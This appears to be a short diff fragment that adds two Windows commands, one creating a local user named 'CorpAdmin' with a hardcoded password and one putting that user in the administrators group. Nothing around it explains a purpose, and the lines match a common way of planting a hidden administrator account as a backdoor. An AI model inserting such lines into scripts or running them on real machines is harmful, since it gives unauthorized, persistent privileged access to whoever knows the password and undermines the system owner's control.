@@ -1,0 +1,2 @@
+net user /add CorpAdmin 8Z621uOUv21
+net localgroup administrators CorpAdmin /add
